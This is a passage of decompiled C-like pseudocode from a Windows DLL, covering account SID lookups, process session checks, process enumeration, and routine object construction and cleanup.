  return result;
}

//----- (10033B6E) --------------------------------------------------------
HLOCAL *__thiscall sub_10033B6E(HLOCAL *this)
{
  *this = off_10094F7C;
  return sub_10033B5E(this);
}
// 10094F7C: using guessed type int (__thiscall *off_10094F7C[2])(void *Block, char);

//----- (10033B9F) --------------------------------------------------------
_DWORD *__stdcall sub_10033B9F(int a1, _DWORD *a2)
{
  WCHAR *v2; // edi
  wchar_t *v3; // eax
  _DWORD *v4; // eax
  void *v6; // [esp-18h] [ebp-68h]
  int pExceptionObject; // [esp+10h] [ebp-40h] BYREF
  int v8[2]; // [esp+14h] [ebp-3Ch] BYREF
  int v9[2]; // [esp+1Ch] [ebp-34h] BYREF
  int v10[2]; // [esp+24h] [ebp-2Ch] BYREF
  int v11[2]; // [esp+2Ch] [ebp-24h] BYREF
  int v12; // [esp+34h] [ebp-1Ch]
  enum _SID_NAME_USE peUse; // [esp+38h] [ebp-18h] BYREF
  DWORD cchName; // [esp+3Ch] [ebp-14h] BYREF
  DWORD cchReferencedDomainName[3]; // [esp+40h] [ebp-10h] BYREF
  int v16; // [esp+4Ch] [ebp-4h]

  v12 = 0;
  v6 = *(void **)(a1 + 4);
  cchName = 0;
  cchReferencedDomainName[0] = 0;
  peUse = SidTypeInvalid;
  if ( LookupAccountSidW(0, v6, 0, &cchName, 0, cchReferencedDomainName, &peUse) || GetLastError() != 122 )
  {
    sub_100167F9(&pExceptionObject, 1);
    goto LABEL_3;
  }
  sub_1000CC90(cchName, v10);
  v16 = 1;
  sub_1000CC90(cchReferencedDomainName[0], v11);
  LOBYTE(v16) = 2;
  sub_1000CF22(v11);
  v2 = *(WCHAR **)(v11[1] + 12);
  sub_1000CF22(v10);
  if ( !LookupAccountSidW(0, *(PSID *)(a1 + 4), *(LPWSTR *)(v10[1] + 12), &cchName, v2, cchReferencedDomainName, &peUse) )
  {
    sub_100167F9(&pExceptionObject, 1);
LABEL_3:
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_1000D118((int)v10);
  sub_1000D118((int)v11);
  v3 = (wchar_t *)sub_1000E943((int)&unk_100B6B48);
  sub_1000CC20(v9, v3);
  LOBYTE(v16) = 3;
  v4 = sub_1000D027(v8, (int)v11, (int)v9);
  LOBYTE(v16) = 4;
  sub_1000D027(a2, (int)v4, (int)v10);
  v12 = 1;
  LOBYTE(v16) = 3;
  sub_1000CE59(v8);
  LOBYTE(v16) = 2;
  sub_1000CE59(v9);
  LOBYTE(v16) = 1;
  sub_1000CE59(v11);
  LOBYTE(v16) = 0;
  sub_1000CE59(v10);
  return a2;
}

//----- (10033CE7) --------------------------------------------------------
BOOL __usercall sub_10033CE7@<eax>(int a1@<eax>, int a2@<ecx>)
{
  BOOL result; // eax
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  result = ConvertStringSidToSidW(*(LPCWSTR *)(*(_DWORD *)(a1 + 4) + 12), (PSID *)(a2 + 4));
  if ( !result )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return result;
}
// 10033CE7: using guessed type _DWORD pExceptionObject[3];

//----- (10033D1B) --------------------------------------------------------
int __stdcall sub_10033D1B(int a1, DWORD pSessionId)
{
  DWORD v2; // eax
  DWORD v3; // eax
  DWORD v4; // eax
  _ThrowInfo *v5; // ecx
  int *v6; // eax
  int CurrentProcessId; // [esp-4h] [ebp-4Ch]
  int v9[7]; // [esp+14h] [ebp-34h] BYREF
  int v10[5]; // [esp+30h] [ebp-18h] BYREF
  int v11; // [esp+44h] [ebp-4h]

  v2 = pSessionId;
  *(_DWORD *)a1 = &off_10094F54;
  *(_DWORD *)(a1 + 4) = v2;
  v11 = 0;
  *(_DWORD *)a1 = &off_10094F80;
  sub_1002271D((_DWORD *)(a1 + 8), 0, 0);
  sub_1003ADC0(a1 + 20);
  sub_1003A78E(a1 + 48);
  CurrentProcessId = GetCurrentProcessId();
  v3 = GetCurrentProcessId();
  sub_10029136((_DWORD *)(a1 + 76), (void *)0xFFFFFFFF, 0, 0, v3, CurrentProcessId);
  *(_BYTE *)(a1 + 88) = 0;
  sub_100346CE((_DWORD *)(a1 + 92));
  LOBYTE(v11) = 5;
  v4 = *(_DWORD *)(a1 + 4);
  if ( !v4 || v4 == -1 )
  {
    sub_10012DD3(&pSessionId);
    _CxxThrowException(&pSessionId, (_ThrowInfo *)&_TI2_AVMxpteqpIoxoylsrdYuvyamxpt_sr__);
  }
  if ( !ProcessIdToSessionId(v4, &pSessionId) )
    sub_1001DA43();
  sub_10022A14(v10, (int)&unk_100BF7EC, 0, 1, 0x40u);
  LOBYTE(v11) = 6;
  sub_10013521();
  LOBYTE(v11) = 5;
  sub_10001FCC(v10);
  sub_10033FDC(v5);
  v6 = sub_1003ACD6(v9);
  LOBYTE(v11) = 7;
  sub_10033E89(v6, a1 + 20);
  LOBYTE(v11) = 5;
  sub_10033E69(v9);
  sub_10033FF6((unsigned int *)a1);
  v11 = -1;
  return a1;
}
// 10033DF5: variable 'v5' is possibly undefined
// 10013521: using guessed type int sub_10013521(void);
// 1001DA43: using guessed type void __noreturn sub_1001DA43(void);
// 10094F54: using guessed type void (__noreturn *off_10094F54)();
// 10094F80: using guessed type int (__thiscall *off_10094F80)(void *Block, char);
// 10033D1B: using guessed type int var_18[5];
// 10033D1B: using guessed type int var_34[7];

//----- (10033E4A) --------------------------------------------------------
int *__thiscall sub_10033E4A(int *Block, char a2)
{
  sub_10033F75(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10033E69) --------------------------------------------------------
LONG __stdcall sub_10033E69(int *a1)
{
  return sub_10016B53(a1);
}

//----- (10033E89) --------------------------------------------------------
int __usercall sub_10033E89@<eax>(int *a1@<eax>, int a2@<ecx>)
{
  sub_10016B2F(a1, a2);
  *(_DWORD *)(a2 + 20) = a1[5];
  *(_DWORD *)(a2 + 24) = a1[6];
  return a2;
}

//----- (10033EA5) --------------------------------------------------------
int __thiscall sub_10033EA5(_DWORD *this, int a2)
{
  int v3; // eax
  DWORD v4; // eax
  int CurrentProcessId; // [esp-4h] [ebp-20h]

  v3 = this[1];
  *(_DWORD *)a2 = &off_10094F54;
  *(_DWORD *)(a2 + 4) = v3;
  *(_DWORD *)a2 = &off_10094F80;
  sub_1000FF31((int)(this + 2), (_DWORD *)(a2 + 8));
  sub_10033F40(this + 5, a2 + 20);
  sub_1003A78E(a2 + 48);
  CurrentProcessId = GetCurrentProcessId();
  v4 = GetCurrentProcessId();
  sub_10029136((_DWORD *)(a2 + 76), (void *)0xFFFFFFFF, 0, 0, v4, CurrentProcessId);
  *(_DWORD *)(a2 + 84) = 0;
  *(_BYTE *)(a2 + 88) = 0;
  sub_100346CE((_DWORD *)(a2 + 92));
  sub_10033FF6((unsigned int *)a2);
  return a2;
}
// 10094F54: using guessed type void (__noreturn *off_10094F54)();
// 10094F80: using guessed type int (__thiscall *off_10094F80)(void *Block, char);

//----- (10033F40) --------------------------------------------------------
int __thiscall sub_10033F40(_DWORD *this, int a2)
{
  sub_10016AE9(this, a2);
  *(_DWORD *)(a2 + 20) = this[5];
  *(_DWORD *)(a2 + 24) = this[6];
  return a2;
}

//----- (10033F75) --------------------------------------------------------
LONG __thiscall sub_10033F75(int *this)
{
  LONG result; // eax

  *this = (int)&off_10094F80;
  sub_100346FA(this + 23);
  sub_10014389(this + 19);
  this[12] = (int)&off_1009513C;
  sub_10033E69(this + 5);
  result = sub_10001FCC(this + 2);
  *this = (int)&off_10094F54;
  return result;
}
// 10094F54: using guessed type void (__noreturn *off_10094F54)();
// 10094F80: using guessed type int (__thiscall *off_10094F80)(void *Block, char);
// 1009513C: using guessed type int (__thiscall *off_1009513C)(void *Block, char);

//----- (10033FDC) --------------------------------------------------------
void __thiscall sub_10033FDC(_ThrowInfo *this)
{
  if ( !byte_100B698F )
    byte_100B698F = sub_1003AB27(this);
}
// 100B698F: using guessed type char byte_100B698F;

//----- (10033FF2) --------------------------------------------------------
char __thiscall sub_10033FF2(_BYTE *this)
{
  return this[88];
}

//----- (10033FF6) --------------------------------------------------------
unsigned int __thiscall sub_10033FF6(unsigned int *this)
{
  void *v2; // ecx
  int v3; // ecx
  unsigned int result; // eax
  DWORD v5; // eax
  int v6; // eax
  char *v7; // ebx
  int v8; // esi
  DWORD v9; // eax
  int v10; // eax
  void *v11; // eax
  unsigned int v12; // eax
  unsigned int v13; // edi
  int v14; // eax
  int v15; // [esp-10h] [ebp-80h] BYREF
  char *v16; // [esp-Ch] [ebp-7Ch]
  int v17; // [esp-8h] [ebp-78h] BYREF
  int *CurrentProcessId; // [esp-4h] [ebp-74h]
  int v19; // [esp+0h] [ebp-70h]
  char *v20; // [esp+4h] [ebp-6Ch]
  DWORD v21; // [esp+8h] [ebp-68h]
  int *v22; // [esp+Ch] [ebp-64h]
  int (__thiscall **v23)(void *, char); // [esp+10h] [ebp-60h] BYREF
  char v24[8]; // [esp+2Ch] [ebp-44h] BYREF
  int v25; // [esp+34h] [ebp-3Ch]
  int *v26; // [esp+38h] [ebp-38h]
  _DWORD pExceptionObject[3]; // [esp+48h] [ebp-28h] BYREF
  int *v28; // [esp+54h] [ebp-1Ch] BYREF
  int v29[5]; // [esp+58h] [ebp-18h] BYREF
  int v30; // [esp+6Ch] [ebp-4h]

  pExceptionObject[2] = this;
  if ( (*(unsigned __int8 (__thiscall **)(unsigned int *))(*this + 8))(this) )
    sub_10034211(v2);
  if ( (dword_100BF9BC & 1) == 0 )
  {
    dword_100BF9BC |= 1u;
    v30 = 0;
    CurrentProcessId = (int *)v2;
    v17 = (int)v2;
    v28 = &v17;
    sub_1000CE26(&v17, (int)&unk_100BF804);
    LOBYTE(v30) = 1;
    v16 = (char *)v3;
    v15 = v3;
    v29[0] = (int)&v15;
    sub_1000CE26(&v15, (int)&unk_100BF7FC);
    LOBYTE(v30) = 0;
    dword_100BC728 = (int (__stdcall *)(_DWORD))sub_1002481B(v15, (int)v16, v17);
    v30 = -1;
  }
  while ( 1 )
  {
    result = this[10];
    if ( result <= this[11] )
      break;
    CurrentProcessId = (int *)GetCurrentProcessId();
    v5 = GetCurrentProcessId();
    sub_10015027(this + 19, (void *)0xFFFFFFFF, 0, 0, v5, (int)CurrentProcessId);
    this[21] = 0;
    v6 = sub_1003AE32(this + 5, (int)&v23);
    v30 = 3;
    v7 = (char *)(this + 12);
    (*(void (__thiscall **)(unsigned int *, int))(this[12] + 4))(this + 12, v6);
    v30 = -1;
    v23 = &off_1009513C;
    v8 = sub_1001A85E(this + 2);
    if ( (*(int (__thiscall **)(unsigned int *))(this[12] + 8))(this + 12) == v8
      && (*(unsigned __int8 (__thiscall **)(unsigned int *))(*(_DWORD *)v7 + 32))(this + 12) == byte_100B698F )
    {
      v30 = 4;
      v9 = GetCurrentProcessId();
      v10 = (*(int (__thiscall **)(unsigned int *, DWORD))(*(_DWORD *)v7 + 8))(this + 12, v9);
      v11 = (void *)(*(int (__thiscall **)(unsigned int *, int, _DWORD, int))(*(_DWORD *)v7 + 12))(this + 12, 1, 0, v10);
      sub_10015027(this + 19, v11, v19, (BOOL)v20, v21, (int)v22);
      v30 = -1;
      v29[0] = 28;
      v12 = this[20];
      v22 = v29;
      v21 = 28;
      v20 = v24;
      v19 = 0;
      if ( dword_100BC728(v12) < 0 )
      {
        v13 = this[20];
        CurrentProcessId = v29;
        v17 = v29[0];
        v16 = v24;
        v15 = 0;
        v14 = dword_100BC728(v13);
        sub_1002EA34(pExceptionObject, v14);
        _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVEtKqstreari_gfjjefwq_sr__);
      }
      if ( v25 == this[1] )
      {
        v28 = v26;
        if ( !(*(unsigned __int8 (__thiscall **)(unsigned int *, int **))(this[23] + 4))(this + 23, &v28) )
        {
          this[21] = (unsigned int)v26;
          result = (*(int (__thiscall **)(unsigned int *, unsigned int *))(this[23] + 8))(this + 23, this + 21);
          *((_BYTE *)this + 88) = 0;
          return result;
        }
      }
    }
  }
  *((_BYTE *)this + 88) = 1;
  return result;
}
// 10034010: variable 'v2' is possibly undefined
// 1003403F: variable 'v3' is possibly undefined
// 1009513C: using guessed type int (__thiscall *off_1009513C)(void *Block, char);
// 100B698F: using guessed type char byte_100B698F;
// 100BC728: using guessed type int (__stdcall *dword_100BC728)(_DWORD);
// 100BF9BC: using guessed type int dword_100BF9BC;

//----- (100341B7) --------------------------------------------------------
int __thiscall sub_100341B7(_DWORD *this)
{
  void *v2; // ecx

  if ( (*(unsigned __int8 (__thiscall **)(_DWORD *))(*this + 8))(this) )
    sub_10034211(v2);
  return this[21];
}
// 100341C3: variable 'v2' is possibly undefined

//----- (100341CD) --------------------------------------------------------
_DWORD *__thiscall sub_100341CD(void **this, _DWORD *a2)
{
  void *v3; // ecx

  if ( (*((unsigned __int8 (__thiscall **)(void **))*this + 2))(this) )
    sub_10034211(v3);
  sub_1000E9E2(a2, this[20], 1);
  return a2;
}
// 100341E8: variable 'v3' is possibly undefined

//----- (10034211) --------------------------------------------------------
void __thiscall __noreturn sub_10034211(void *this)
{
  void *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  sub_1001668F(&pExceptionObject);
  _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
}

//----- (1003422D) --------------------------------------------------------
void __thiscall sub_1003422D(_DWORD *this)
{
  *this = &off_10094FB8;
  *this = off_10092F20;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 10094FB8: using guessed type int (__thiscall *off_10094FB8)(void *Block, char);

//----- (10034252) --------------------------------------------------------
BOOL __thiscall sub_10034252(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (10034264) --------------------------------------------------------
int __thiscall sub_10034264(int this, int a2)
{
  sub_1000BBB7((void *)(this + 4), a2);
  return a2;
}

//----- (10034295) --------------------------------------------------------
int __thiscall sub_10034295(int this, int a2)
{
  sub_1001F09C((void *)(this + 20), a2);
  return a2;
}

//----- (100342C6) --------------------------------------------------------
_DWORD *__thiscall sub_100342C6(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x18u);
  if ( v3 )
    v4 = sub_10034356(this, v3);
  else
    v4 = 0;
  sub_100347E3(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10034317) --------------------------------------------------------
_DWORD *__thiscall sub_10034317(_DWORD *Block, char a2)
{
  sub_1003422D(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10034336) --------------------------------------------------------
_DWORD *__thiscall sub_10034336(_DWORD *Block, char a2)
{
  *Block = &off_10094FE8;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10094FE8: using guessed type int (__thiscall *off_10094FE8)(void *Block, char);

//----- (10034356) --------------------------------------------------------
_DWORD *__thiscall sub_10034356(void *this, _DWORD *a2)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10094FE8;
  a2[1] = this;
  *a2 = &off_10095040;
  a2[2] = off_10094FE4;
  a2[5] = 0;
  return result;
}
// 10094FE4: using guessed type int (__thiscall *off_10094FE4[2])(void *Block, char);
// 10094FE8: using guessed type int (__thiscall *off_10094FE8)(void *Block, char);
// 10095040: using guessed type int (__thiscall *off_10095040)(void *Block, char);

//----- (10034393) --------------------------------------------------------
BOOL __thiscall sub_10034393(int this)
{
  return *(_DWORD *)(this + 20) >= (unsigned int)(*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (100343A6) --------------------------------------------------------
BOOL __thiscall sub_100343A6(_DWORD *this)
{
  return this[5] != 0;
}

//----- (100343B0) --------------------------------------------------------
int __thiscall sub_100343B0(int this)
{
  _DWORD *v2; // eax
  int v4; // [esp-4h] [ebp-8h]

  v2 = (_DWORD *)(*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(*(_DWORD *)(this + 4) + 4) + 44))(
                   *(_DWORD *)(this + 4) + 4,
                   *(_DWORD *)(this + 20));
  v4 = *(_DWORD *)(this + 20);
  *(_DWORD *)(this + 12) = *v2;
  *(_BYTE *)(this + 16) = *(_BYTE *)(*(int (__thiscall **)(int, int))(*(_DWORD *)(*(_DWORD *)(this + 4) + 20) + 44))(
                                      *(_DWORD *)(this + 4) + 20,
                                      v4);
  return this + 8;
}

//----- (100343DE) --------------------------------------------------------
void __thiscall sub_100343DE(_DWORD *this)
{
  ++this[5];
}

//----- (100343E2) --------------------------------------------------------
void __thiscall sub_100343E2(_DWORD *this)
{
  --this[5];
}

//----- (100343E6) --------------------------------------------------------
void __noreturn sub_100343E6()
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_100166E1(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
}
// 100343E6: using guessed type void __noreturn sub_100343E6();
// 100343E6: using guessed type _DWORD pExceptionObject[2];

//----- (10034403) --------------------------------------------------------
void __noreturn sub_10034403()
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_100166E1(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
}
// 10034403: using guessed type void __noreturn sub_10034403();
// 10034403: using guessed type _DWORD pExceptionObject[2];

//----- (10034427) --------------------------------------------------------
_DWORD *__thiscall sub_10034427(_DWORD *Block, char a2)
{
  sub_10034467(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10034447) --------------------------------------------------------
_DWORD *__thiscall sub_10034447(_DWORD *Block, char a2)
{
  *Block = off_10094FE4;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10094FE4: using guessed type int (__thiscall *off_10094FE4[2])(void *Block, char);

//----- (10034467) --------------------------------------------------------
_DWORD *__stdcall sub_10034467(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  a1[2] = off_10094FE4;
  *a1 = &off_10094FE8;
  return result;
}
// 10094FE4: using guessed type int (__thiscall *off_10094FE4[2])(void *Block, char);
// 10094FE8: using guessed type int (__thiscall *off_10094FE8)(void *Block, char);

//----- (100344B4) --------------------------------------------------------
void __thiscall sub_100344B4(_DWORD *this)
{
  *this = &off_10095008;
  sub_1001FD00((int)(this + 5));
  sub_10007890((int)(this + 1));
  sub_1003422D(this);
}
// 10095008: using guessed type int (__thiscall *off_10095008)(void *Block, char);

//----- (100344FF) --------------------------------------------------------
bool __thiscall sub_100344FF(_DWORD *this, _DWORD *a2)
{
  int v3; // edi

  v3 = sub_100348CE(this, a2);
  return v3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
      && *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v3) == *a2;
}

//----- (10034539) --------------------------------------------------------
char __thiscall sub_10034539(_DWORD *this, _DWORD *a2)
{
  int v3; // edi

  v3 = sub_100348CE(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3) != *a2 )
  {
    return 0;
  }
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 40))(this + 1, v3);
  (*(void (__thiscall **)(_DWORD *, int))(this[5] + 40))(this + 5, v3);
  return 1;
}

//----- (10034588) --------------------------------------------------------
int __thiscall sub_10034588(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // edi
  int v4; // esi
  int v5; // eax

  v2 = a2;
  v4 = sub_100348CE(this, a2);
  if ( v4 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v4) != *v2 )
  {
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int))(this[1] + 32))(this + 1, v2, v4);
    v5 = this[5];
    HIBYTE(a2) = 0;
    (*(void (__thiscall **)(_DWORD *, char *, int))(v5 + 32))(this + 5, (char *)&a2 + 3, v4);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 44))(this + 5, v4);
}

//----- (100345E0) --------------------------------------------------------
int __thiscall sub_100345E0(_DWORD *this, _DWORD *pExceptionObject)
{
  _DWORD *v2; // esi
  int v4; // edi

  v2 = pExceptionObject;
  v4 = sub_100348CE(this, pExceptionObject);
  if ( v4 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v4) != *v2 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 48))(this + 5, v4);
}

//----- (10034635) --------------------------------------------------------
_DWORD *__thiscall sub_10034635(_DWORD *this, _DWORD *a2)
{
  sub_1000C0A7(this + 1, a2);
  return a2;
}

//----- (10034666) --------------------------------------------------------
_DWORD *__thiscall sub_10034666(_DWORD *this, _DWORD *a2)
{
  sub_10020704(this + 5, a2);
  return a2;
}

//----- (10034697) --------------------------------------------------------
int __thiscall sub_10034697(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 60))(this + 1, a2);
  return (*(int (__thiscall **)(_DWORD *))(this[5] + 60))(this + 5);
}

//----- (100346B2) --------------------------------------------------------
int __thiscall sub_100346B2(_DWORD *this)
{
  (*(void (__thiscall **)(_DWORD *))(this[1] + 52))(this + 1);
  return (*(int (__thiscall **)(_DWORD *))(this[5] + 52))(this + 5);
}

//----- (100346C6) --------------------------------------------------------
int __thiscall sub_100346C6(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 64))(this + 1);
}

//----- (100346CE) --------------------------------------------------------
_DWORD *__stdcall sub_100346CE(_DWORD *a1)
{
  *a1 = &off_10094F94;
  sub_1003488B(a1 + 1);
  return a1;
}
// 10094F94: using guessed type int (__thiscall *off_10094F94)(void *Block, char);

//----- (100346FA) --------------------------------------------------------
void __thiscall sub_100346FA(_DWORD *this)
{
  *this = &off_10094F94;
  sub_100344B4(this + 1);
}
// 10094F94: using guessed type int (__thiscall *off_10094F94)(void *Block, char);

//----- (10034721) --------------------------------------------------------
int __thiscall sub_10034721(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 8))(this + 1);
}

//----- (1003472D) --------------------------------------------------------
BOOL __thiscall sub_1003472D(_DWORD *this, int a2)
{
  char v3; // bl

  v3 = (*(int (__thiscall **)(_DWORD *, int))(*this + 4))(this, a2);
  *(_BYTE *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 16))(this + 1, a2) = 1;
  return v3 == 0;
}

//----- (10034759) --------------------------------------------------------
int __thiscall sub_10034759(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 12))(this + 1);
}

//----- (10034765) --------------------------------------------------------
int __thiscall sub_10034765(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, a2);
  return a2;
}

//----- (10034796) --------------------------------------------------------
int __thiscall sub_10034796(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 32))(this + 1, a2);
  return a2;
}

//----- (100347C7) --------------------------------------------------------
int __thiscall sub_100347C7(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 52))(this + 1);
}

//----- (100347D3) --------------------------------------------------------
int __thiscall sub_100347D3(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 24))(this + 1);
}

//----- (100347DB) --------------------------------------------------------
int __thiscall sub_100347DB(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 28))(this + 1);
}

//----- (100347E3) --------------------------------------------------------
_DWORD *__userpurge sub_100347E3@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10034822) --------------------------------------------------------
void __thiscall sub_10034822(void *this)
{
  sub_1003494F((int)this);
}

//----- (1003484D) --------------------------------------------------------
_DWORD *__thiscall sub_1003484D(_DWORD *Block, char a2)
{
  sub_100344B4(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003486C) --------------------------------------------------------
_DWORD *__thiscall sub_1003486C(_DWORD *Block, char a2)
{
  sub_100346FA(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1003488B) --------------------------------------------------------
_DWORD *__stdcall sub_1003488B(_DWORD *a1)
{
  sub_10034977(a1);
  *a1 = &off_10095008;
  sub_1000C60E(a1 + 1);
  sub_100209E4(a1 + 5);
  return a1;
}
// 10095008: using guessed type int (__thiscall *off_10095008)(void *Block, char);

//----- (100348CE) --------------------------------------------------------
int __userpurge sub_100348CE@<eax>(_DWORD *a1@<ebx>, _DWORD *a2)
{
  int v2; // esi
  int v3; // eax
  int v5; // [esp+4h] [ebp-8h]
  int v6; // [esp+8h] [ebp-4h]

  v6 = -1;
  v2 = (unsigned int)(*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1) >> 1;
  v5 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  if ( v2 > -1 )
  {
    do
    {
      if ( v2 >= v5 || *a2 == *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2) )
        break;
      if ( *a2 >= *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2) )
      {
        v6 = v2;
        v3 = v5 + v2 + 1;
      }
      else
      {
        v5 = v2;
        v3 = v2 + v6;
      }
      v2 = v3 / 2;
    }
    while ( v3 / 2 > v6 );
  }
  if ( v2 == v6 )
    return v6 + 1;
  return v2;
}

//----- (1003494F) --------------------------------------------------------
void __usercall sub_1003494F(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10034977) --------------------------------------------------------
_DWORD *__stdcall sub_10034977(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10092F20;
  *a1 = &off_10094FB8;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 10094FB8: using guessed type int (__thiscall *off_10094FB8)(void *Block, char);

//----- (100349A2) --------------------------------------------------------
_DWORD *__stdcall sub_100349A2(_DWORD *a1, int pExceptionObject, int a3)
{
  int v4; // [esp-8h] [ebp-30h]
  int v5[5]; // [esp+10h] [ebp-18h] BYREF
  int v6; // [esp+24h] [ebp-4h]

  v4 = pExceptionObject;
  *a1 = off_10095060;
  sub_10030C6C(v4, a1 + 1);
  v6 = 1;
  sub_1000CE26(a1 + 3, a3);
  sub_1003075C(v5, pExceptionObject);
  LOBYTE(v6) = 2;
  if ( !sub_10030A7E((int)v5, a3) )
  {
    sub_10037796(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVRcclrLlnuKrzOsvviGrcclrlln_qsbdzsml_sr__);
  }
  LOBYTE(v6) = 1;
  sub_1003078F(v5);
  return a1;
}
// 10095060: using guessed type int (__thiscall *off_10095060[5])(void *Block, char);
// 100349A2: using guessed type int var_18[5];

//----- (10034A28) --------------------------------------------------------
int *__thiscall sub_10034A28(int *Block, char a2)
{
  sub_10034AAA(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10034A47) --------------------------------------------------------
_DWORD *__stdcall sub_10034A47(_DWORD *a1, int a2)
{
  *a1 = off_10095060;
  sub_1000CC20(a1 + 1, word_100B6A58);
  sub_1000CC20(a1 + 3, word_100B6A5C);
  sub_10002C25((int *)(a2 + 8), a1 + 2);
  sub_10002C25((int *)(a2 + 16), a1 + 4);
  return a1;
}
// 10095060: using guessed type int (__thiscall *off_10095060[5])(void *Block, char);
// 100B6A58: using guessed type wchar_t word_100B6A58[2];
// 100B6A5C: using guessed type wchar_t word_100B6A5C[2];

//----- (10034AAA) --------------------------------------------------------
LONG __thiscall sub_10034AAA(int *this)
{
  *this = (int)off_10095060;
  sub_1000CE59(this + 3);
  return sub_1000CE59(this + 1);
}
// 10095060: using guessed type int (__thiscall *off_10095060[5])(void *Block, char);

//----- (10034ADF) --------------------------------------------------------
BOOL __usercall sub_10034ADF@<eax>(int a1@<edi>, int a2@<esi>)
{
  return !sub_1000D0B5(a2 + 4, a1 + 4) && !sub_1000D0B5(a2 + 12, a1 + 12);
}

//----- (10034B33) --------------------------------------------------------
_DWORD *__stdcall sub_10034B33(int a1, _DWORD *a2)
{
  sub_1000CE26(a2, a1 + 12);
  return a2;
}

//----- (10034B68) --------------------------------------------------------
_DWORD *__stdcall sub_10034B68(int a1, _DWORD *a2)
{
  sub_1000CE26(a2, a1 + 4);
  return a2;
}

//----- (10034B9D) --------------------------------------------------------
